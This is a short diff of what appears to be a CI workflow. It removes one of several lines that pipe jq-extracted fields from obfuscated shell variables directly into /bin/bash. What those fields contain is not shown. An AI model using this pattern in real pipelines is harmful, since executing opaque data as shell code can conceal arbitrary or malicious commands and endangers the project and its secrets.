@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$vpn35" | jq -r .ti662 | /bin/bash
           echo $i48 | jq -r .tammf7611 | /bin/bash
           printf '%s' "$b925" | jq -r .kigzj5 | /bin/bash
-          echo $khejm31 | jq -r .se17 | /bin/bash
           printf '%s' "$y43" | jq -r .zazej368 | /bin/bash
           echo $b65 | jq -r .ianfg084 | /bin/bash
           echo $cfh6789 | jq -r .bctg502 | /bin/bash
